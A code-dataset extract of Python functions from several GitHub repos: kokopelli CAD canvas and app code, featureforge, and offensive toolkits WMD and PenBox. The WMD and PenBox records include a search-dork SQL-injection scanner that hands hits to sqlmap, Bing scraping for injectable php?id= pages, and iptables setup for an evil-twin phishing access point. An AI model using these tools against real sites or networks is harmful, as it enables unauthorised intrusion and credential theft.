soup.find(text=re.compile('Query failed:'))\n                checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))\n                print('\\t[V]  Check11 Postgre found: ' + str(checkverPO1).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n                print('\\t[V]  Check12 Postgre found: ' + str(checkverPO2).replace('\\n', ' ').replace('\\r', '').replace('\\t', '').replace('  ', ''))\n\n            # If X is vuln\n            if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):\n                print(\n                    bc.OKGREEN +\n                    '\\n' +\n                    '                   Possible vuln url!' +\n                    '\\n' +\n                    '\\t[' +\n                    time.strftime('%H:%M:%S') +\n                    ']  [+]  ' +\n                    line + bc.ENDC +\n                    '\\n'\n                )\n                if savesearch == 'y':\n                    with open(filename, 'a') as file:\n                        file.write(line)\n            else:\n                print(\n                    bc.WARNING +\n                    '\\t[' +\n                    time.strftime('%H:%M:%S') +\n                    ']  [-]  ' + line + bc.ENDC\n                )\n\n        # Skip X or/and exit\n        except KeyboardInterrupt:\n            print(bc.FAIL + '\\t[X]  ' + line + bc.ENDC)\n            print('\\t[!] Quit? Press enter for continue, or n for quit (y/n)')\n            quitnow = input('\\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'quit:' + bc.ENDC + ' ')\n            if quitnow == 'y':\n                print(bc.ENDC + '\\t[!] Exiting\\n\\n')\n                return None\n            else:\n                print(bc.ENDC + '\\t[!] Continuing\\n\\n')\n\n        # Bad X\n        except:\n            print(bc.FAIL + '\\t[X]  ' + line + bc.ENDC)\n\n# =================================\n# Done - sum it up\n# =================================\nprint('\\n\\t[+] Done scanning urls')\nif savesearch == 'y':\n    with open(filename) as f:\n        resultsnumber = sum(1 for _ in f)\n    print('\\t[+] Scraping saved in file: ' + filename)\n    print('\\t[+] Total saved urls:  ' + str(resultsnumber))\n    if resultsnumber == 0:\n        print('\\t[+] No vuln urls, exiting\\n\\n')\n        return None\nprint('\\t[!]  Run vuln urls through SQLmap (y/n)?')\ncheckurls = input('\\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'runSQLmap:' + bc.ENDC + ' ')\nif checkurls == 'y':\n    scan_urls_sqlmap(filename)\nelse:\n    print(bc.ENDC + '\\t[!] Exiting\\n\\n')\n    return None", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Load the config file.\"\"\"\n", "func_signal": "def config():\n", "code": "config = configparser.ConfigParser()\ntry:\n    config.read('core/config.ini')\nexcept:\n    config.read('config.ini')\nreturn config", "path": "core\\core.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Cleaning up rules in iptables and allowing passthrough access.\"\"\"\n", "func_signal": "def iptables_allow_access():\n", "code": "cleanup_iptables()\nos.system('ifconfig ' + sop.int_mon + ' 10.0.0.1 up')\nos.system('sysctl -w net.ipv4.ip_forward=1')\nos.system('iptables -P FORWARD ACCEPT')\nos.system('iptables --table nat -A POSTROUTING -o ' + sop.int_net + ' -j MASQUERADE')", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"Show all options.\n\nSending main options to the core module modules.py for parsing.\n\"\"\"\n", "func_signal": "def show_all(self):\n", "code": "cmodules.showModuleData(\n    options.Author,\n    options.Name,\n    options.Call,\n    options.Category,\n    options.Type,\n    options.Version,\n    options.Description,\n    options.License,\n    options.Datecreation,\n    options.Lastmodified\n)\nself.show_commands()\nself.show_opt()", "path": "modules\\sql\\gdorksqli.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\"The first function to run.\"\"\"\n", "func_signal": "def main():\n", "code": "print('\\n')\nprint('\\t    ___    ____           __    _      __    _              ')\nprint('\\t   /   |  / __ \\   ____  / /_  (_)____/ /_  (_)___  ____ _  ')\nprint('\\t  / /| | / /_/ /  / __ \\/ __ \\/ / ___/ __ \\/ / __ \\/ __ `/  ')\nprint('\\t / ___ |/ ____/  / /_/ / / / / (__  ) / / / / / / / /_/ /   ')\nprint('\\t/_/  |_/_/      / .___/_/ /_/_/____/_/ /_/_/_/ /_/\\__, /    ')\nprint('\\t               /_/                               /____/     ')\nprint('\\n')\nif os.getuid() != 0:\n    print('r00tness is needed due to XXX!')\n    print('Run the script again as root/sudo')\n    return None\n# print('\\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)\n# comm.checkNetConnectionV()\nprint('')\nglobal sop\n# The parameters to be passed to the module on run\nsop = Options(INTERFACE_NET, INTERFACE_MON, '192.168.1.1', 'FREEWIFI', '1')\nif args.run:\n    run()\nelse:\n    console()", "path": "modules\\phishing\\et_phishing.py", "repo_name": "ThomasTJdev/WMD", "stars": 264, "license": "None", "language": "python", "size": 3797}
{"docstring": "\"\"\" @brief Warns of unsaved changes then exits.\n\"\"\"\n", "func_signal": "def exit(self, event=None):\n", "code": "if self.saved or dialogs.warn_changes():\n    koko.FRAME.Destroy()\n\n    # Delete these objects to avoid errors due to deletion order\n    # during Python's cleanup stage\n    del koko.FRAME\n    del koko.EDITOR\n    del koko.CANVAS\n    del koko.GLCANVAS", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Binds a set of Canvas callbacks.\n\"\"\"\n", "func_signal": "def bind_callbacks(self):\n", "code": "self.Bind(wx.EVT_PAINT,         self.paint)\nself.Bind(wx.EVT_MOTION,        self.mouse_move)\nself.Bind(wx.EVT_LEFT_DOWN,     self.mouse_lclick)\nself.Bind(wx.EVT_LEFT_DCLICK,   self.mouse_dclick)\nself.Bind(wx.EVT_LEFT_UP,       self.mouse_lrelease)\nself.Bind(wx.EVT_RIGHT_DOWN,    self.mouse_rclick)\nself.Bind(wx.EVT_MOUSEWHEEL,    self.mouse_scroll)\nself.Bind(wx.EVT_SIZE,          self.mark_changed_view)\nself.Bind(wx.EVT_ERASE_BACKGROUND, lambda e: None)\nself.Bind(wx.EVT_CHAR,          self.char)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Draws rectangular border around individual images.\n\"\"\"\n", "func_signal": "def draw_bounds(self):\n", "code": "for i in self.images:\n    scale = self.scale / self.mm_per_unit\n    xmin, ymin = self.pos_to_pixel(\n        i.xmin / self.mm_per_unit, i.ymin / self.mm_per_unit\n    )\n    xmax, ymax = self.pos_to_pixel(\n        i.xmax / self.mm_per_unit, i.ymax / self.mm_per_unit\n    )\n\n    self.dc.SetPen(wx.Pen((128, 128, 128)))\n    self.dc.SetBrush(wx.TRANSPARENT_BRUSH)\n    self.dc.DrawRectangle(xmin, ymin, xmax-xmin, ymax-ymin)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Stores paths and traverses then refreshes canvas\n    @details Should only be called from main thread\n\"\"\"\n", "func_signal": "def _load_paths(self, paths, traverses):\n", "code": "self.paths = paths\nself.traverses = traverses\nself.Refresh()", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Creates a new file from the default template. \"\"\"\n", "func_signal": "def new(self, event=None):\n", "code": "if self.saved or dialogs.warn_changes():\n\n    self.filename = ''\n    self.mode = 'cad'\n    self.clear()\n\n    koko.EDITOR.text = TEMPLATE\n\n    self.first_render = True", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Callback when a save point is reached in the editor.\n    @param event Either a boolean value or a StyledTextEvent\n    from the callback.\n\"\"\"\n", "func_signal": "def savepoint(self, event):\n", "code": "if type(event) is wx.stc.StyledTextEvent:\n    value = (event.EventType == wx.stc.wxEVT_STC_SAVEPOINTREACHED)\nelse:\n    value = event\n\nif value == self.saved: return\n\n# Modify the window titlebar.\nself.saved = value\ns = '%s:  ' % NAME\nif self.filename:\n    s += self.filename\nelse:\n    s += '[Untitled]'\n\nif not self.saved:\n    s += '*'\n\nkoko.FRAME.SetTitle(s)", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Clears stored paths; redraws canvas.\n\"\"\"\n", "func_signal": "def clear_path(self):\n", "code": "self.paths = None\nself.Refresh()\nreturn", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Snaps to view centered on the current image.\n\"\"\"\n\n", "func_signal": "def snap_bounds(self):\n", "code": "if not self.image:  return\n\nwidth, height = self.Size\n\ntry:\n    self.center = [\n        (self.image.xmin + self.image.dx/2.) / self.mm_per_unit,\n        (self.image.ymin + self.image.dy/2.) / self.mm_per_unit\n    ]\n\n    self.scale = float(\n        min(width/(self.image.dx/self.mm_per_unit),\n            height/(self.image.dy/self.mm_per_unit))\n    )\n    self.alpha = self.beta = 0\nexcept TypeError:\n    pass\nelse:\n    self.mark_changed_view()\n\nself.Refresh()", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Converts an x, y position in mm into an i,j coordinate\n    @details Uses self.mm_per_unit to synchronize scales\n    @returns A 2-item tuple representing i,j position\n\"\"\"\n", "func_signal": "def mm_to_pixel(self, x, y=None):\n", "code": "width, height = self.Size\nxcenter, ycenter = self.center\nxcenter *= self.mm_per_unit\nycenter *= self.mm_per_unit\nscale = self.scale / self.mm_per_unit\n\nif y is None:\n    return int(x*scale)\nelse:\n    return map(int,\n        [(x - xcenter) * scale + (width / 2.),\n         height/2. - (y - ycenter) * scale]\n    )", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Open a file dialog to get a target, then load it.\n\"\"\"\n# Open a file dialog to get target\n", "func_signal": "def open(self, event=None):\n", "code": "if self.saved or dialogs.warn_changes():\n    df = dialogs.open_file(self.directory)\n    if df[1] != '':\n        self.directory, self.filename = df\n        self.load()", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Converts an x, y position in arbitrary units into an i,j coordinate\n    @returns A 2-item tuple representing i,j position\n\"\"\"\n\n", "func_signal": "def pos_to_pixel(self, x, y=None):\n", "code": "width, height = self.Size\nxcenter, ycenter = self.center\n\nif y is None:\n    return int(x*self.scale)\nelse:\n    return map(int,\n        [(x - xcenter) * self.scale + (width / 2.),\n         height/2. - (y - ycenter) * self.scale]\n    )", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "''' General-purpose export callback.  Decides which export\n    command to call based on the menu item text.'''\n\n", "func_signal": "def export(self, event):\n", "code": "item = koko.FRAME.GetMenuBar().FindItemById(event.GetId())\nfiletype = item.GetLabel()\n\nif   self.mode == 'cad':    self.export_from_cad(filetype)\nelif self.mode == 'asdf':   self.export_from_asdf(filetype)", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Save As callback from main menu.\n\"\"\"\n\n# Open a file dialog to get target\n", "func_signal": "def save_as(self, event=None):\n", "code": "df = dialogs.save_as(self.directory, extension='.ko')\n\nif df[1] != '':\n    self.directory, self.filename = df\n    self.save()", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "'''Redraws the window.'''\n\n", "func_signal": "def paint(self, event=None):\n", "code": "self.dc = wx.PaintDC(self)\nself.dc.SetBackground(wx.Brush((20,20,20)))\nself.dc.Clear()\n\n# Draw the active iamge\nself.draw_image()\n\n# Draw bounds only if 'Show bounds' is checked\nif koko.FRAME.get_menu('View','Show bounds').IsChecked():\n    self.draw_bounds()\n\n# Draw x and y axes\nif koko.FRAME.get_menu('View','Show axes').IsChecked():\n    self.draw_axes()\n\nself.draw_paths()\n\n# Draw border\nself.draw_border()\n\nkoko.PRIMS.draw(self)\n\nself.dc = None", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Switches between CAD/CAM and CAM modes\n    @param value New mode ('cad,'asdf', or 'stl')\n\"\"\"\n", "func_signal": "def mode(self, value):\n", "code": "self._mode = value\n\nkoko.FRAME.get_menu('File','Reload').Enable(True)\nkoko.FRAME.get_menu('File','Save').Enable(True)\nkoko.FRAME.get_menu('File','Save As').Enable(True)\nkoko.FRAME.get_menu('View','Show script').Enable(True)\nkoko.FRAME.get_menu('View','Show output').Enable(True)\nkoko.FRAME.get_menu('View','Re-render').Enable(True)\nfor e in ['.png','.svg','.stl', '.dot','.asdf']:\n    koko.FRAME.get_menu('Export', e).Enable(True)\n\nif value in ['stl','asdf','png','vol']:\n    koko.FRAME.get_menu('File','Reload').Enable(False)\n    koko.FRAME.get_menu('File','Save').Enable(False)\n    koko.FRAME.get_menu('File','Save As').Enable(False)\n    koko.FRAME.get_menu('View','Show script').Enable(False)\n    koko.FRAME.get_menu('View','Show script').Check(False)\n    koko.FRAME.show_script(False)\n    koko.FRAME.get_menu('View','Show output').Enable(False)\n    koko.FRAME.get_menu('View','Show output').Check(False)\n    koko.FRAME.show_output(False)\n    koko.FRAME.get_menu('View','Re-render').Enable(False)\n\n    # Disable all exports for these values\n    if value in ['stl','png','vol']:\n        for e in ['.png','.svg','.stl', '.dot','.asdf']:\n            koko.FRAME.get_menu('Export', e).Enable(False)\n\n    # Disable some exports for these other values\n    elif value == 'asdf':\n        for e in ['.svg','.dot']:\n            koko.FRAME.get_menu('Export', e).Enable(False)\n\n    koko.FRAME.get_menu('Export','Show CAM panel').Check(value == 'vol')\n    koko.FRAME.show_import(value == 'vol')\n    koko.FRAME.show_cam(value != 'vol')", "path": "koko\\app.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Release the current drag target.\n\"\"\"\n", "func_signal": "def mouse_lrelease(self, event):\n", "code": "if self.drag_target:\n    if self.dragged and self.drag_target != self:\n        koko.PRIMS.push_stack()\n    elif not self.dragged:\n        koko.PRIMS.close_panels()\n    self.drag_target = None", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Sets border property and calls Refresh\n\"\"\"\n", "func_signal": "def border(self, value):\n", "code": "self._border = value\nwx.CallAfter(self.Refresh)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\" @brief Draws x, y, z axes in red, green, and blue.\n\"\"\"\n", "func_signal": "def draw_axes(self):\n", "code": "def spin(x, y, z, alpha, beta):\n    ca, sa = cos(alpha), sin(alpha)\n    x, y, z = (ca*x - sa*y, sa*x + ca*y, z)\n\n    cb, sb = cos(beta), sin(beta)\n    x, y, z = (x, cb*y + sb*z, -sb*y + cb*z)\n\n    return x, y, z\n\ncenter = self.pos_to_pixel(0, 0)\nself.dc.SetPen(wx.Pen((255, 0, 0), 2))\nx, y, z = spin(50, 0, 0, -self.alpha, -self.beta)\nself.dc.DrawLine(center[0], center[1], center[0] + x, center[1] - y)\n\nself.dc.SetPen(wx.Pen((0, 255, 0), 2))\nx, y, z = spin(0, 50, 0, -self.alpha, -self.beta)\nself.dc.DrawLine(center[0], center[1], center[0] + x, center[1] - y)\n\nself.dc.SetPen(wx.Pen((0, 0, 255), 2))\nx, y, z = spin(0, 0, 50, -self.alpha, -self.beta)\nself.dc.DrawLine(center[0], center[1], center[0] + x, center[1] - y)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "''' Pop up a menu to create primitives. '''\n", "func_signal": "def mouse_rclick(self, event):\n", "code": "menu = show_menu()\n\nmenu.AppendSeparator()\n\nsnap = menu.Append(wx.ID_ANY, text='Snap to bounds')\nself.Bind(wx.EVT_MENU, lambda e: self.snap_bounds(), snap)\n\n# Get the a target primitive to delete\nself.mouse = wx.Point(event.GetX(), event.GetY())\nx, y = self.pixel_to_pos(*self.mouse)\nt = koko.PRIMS.get_target(x, y)\ndelete = menu.Append(wx.ID_ANY, text='Delete')\nif t is not None:\n    self.Bind(wx.EVT_MENU, lambda e: koko.PRIMS.delete(t), delete)\nelse:\n    delete.Enable(False)\n\nundo = menu.Append(wx.ID_ANY, text='Undo')\nif koko.PRIMS.can_undo:\n    self.Bind(wx.EVT_MENU, koko.PRIMS.undo, undo)\nelse:\n    undo.Enable(False)\n\nself.PopupMenu(menu)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "''' Draws the current image in the dc. '''\n\n", "func_signal": "def draw_image(self):\n", "code": "if not self.image:  return\n\n\nwidth, height = self.Size\nxcenter, ycenter = self.center[0], self.center[1]\n\nif self.scale / self.mm_per_unit == self.image.pixels_per_mm:\n\n    # If the image is at the correct scale, then we're fine\n    # to simply render it at its set position\n    bitmap = wx.BitmapFromImage(self.image.wximg)\n    xmin = self.image.xmin\n    ymax = self.image.ymax\nelse:\n\n    # Otherwise, we have to rescale the image\n    # (and we'll pre-emptively crop it to avoid\n    #  blowing it up to a huge size)\n    crop = self.get_crop()\n\n    if crop.Width <= 0 or crop.Height <= 0:  return\n\n    scale = self.scale / (self.mm_per_unit * self.image.pixels_per_mm)\n\n    img = self.image.wximg.Copy().GetSubImage(crop)\n    if int(img.Width*scale) == 0 or int(img.Height*scale) == 0:\n        return\n\n    img.Rescale(img.Width  * scale,\n                img.Height * scale)\n    bitmap = wx.BitmapFromImage(img)\n\n    xmin = (\n        self.image.xmin +\n        crop.Left*self.image.mm_per_pixel\n    )\n    ymax = (\n        self.image.ymax -\n        crop.Top*self.image.mm_per_pixel\n    )\n\n# Draw image\nimgX, imgY = self.mm_to_pixel(xmin, ymax)\n\nself.dc.SetBrush(wx.Brush((0,0,0)))\nself.dc.SetPen(wx.TRANSPARENT_PEN)\nself.dc.DrawRectangle(imgX, imgY, bitmap.Width, bitmap.Height)\nself.dc.DrawBitmap(bitmap, imgX, imgY)", "path": "koko\\canvas.py", "repo_name": "mkeeter/kokopelli", "stars": 293, "license": "other", "language": "python", "size": 370}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V3.1\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V1.4\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V1.3\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V3.2\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V3.1\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V1.3\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V2.4\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V2.2\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V1.4\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V2.4\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V1.3\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V1.4\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V3.1\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V2.2\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V3.2\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V2.2\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V1.2\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nget unique from list found it on stackoverflow\n\"\"\"\n", "func_signal": "def unique(seq):\n", "code": "seen = set()\nreturn [seen.add(x) or x for x in seq if x not in seen]", "path": "Versions\\V1.2\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nclear the screen in case of GNU/Linux or \nwindows \n\"\"\"\n", "func_signal": "def clearScr() :\n", "code": "if system() == 'Linux':\n    os.system('clear')\nif system() == 'Windows':\n    os.system('cls')", "path": "Versions\\V2.4\\PenBox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\njust grabs all websites in server with php?id= dork \nfor scanning for error based sql injection\n\"\"\"\n", "func_signal": "def grabSqli(self) :\n", "code": "page = 1\nlista = []\nwhile page <= 101:\n    try:\n        bing = \"http://www.bing.com/search?q=ip%3A\" + self.serverip + \"+php?id=&count=50&first=\" + str(page)\n        openbing = urllib2.urlopen(bing)\n        readbing = openbing.read()\n        findwebs = re.findall('<h2><a href=\"(.*?)\"', readbing)\n        for i in range(len(findwebs)):\n            x = findwebs[i]\n            lista.append(x)\n    except:\n        pass            \n    page += 50  \nlista = unique(lista)       \nself.checkSqli(lista)", "path": "Versions\\V1.2\\penbox.py", "repo_name": "x3omdax/PenBox", "stars": 459, "license": "other", "language": "python", "size": 139}
{"docstring": "\"\"\"\nThe only way of storing experiment results is by having the \"booking ticket\" (ie,\nthe result of a successfull booking).\n\nReturns True if the storage succedded, and False if not.\nBe aware that if you attempt to store results after the booking time expired,\nit's totally possible that same experiment was booked for someone else.\n\"\"\"\n", "func_signal": "def store_results(self, booking_ticket, results):\n", "code": "query = {u'_id': booking_ticket,\n         self.experiment_status: self.STATUS_BOOKED}\nupdate = {\n    '$set': {self.experiment_status: self.STATUS_SOLVED,\n             self.results_key: mongo_dict_key_sanitizer(results)\n             },\n}\nexperiment = self.data.find_and_modify(query, update)\nif experiment is None:\n    logger.warning(\n        \"Experiment with booking_ticket %s wasn't stored, because not found on \"\n        \"stats database as waiting-results.\" % booking_ticket)\n    return False\nelse:\n    logger.info(\"Stored experiment results for ticket %s\" % booking_ticket)\n    return True", "path": "featureforge\\experimentation\\stats_manager.py", "repo_name": "machinalis/featureforge", "stars": 382, "license": "other", "language": "python", "size": 188}
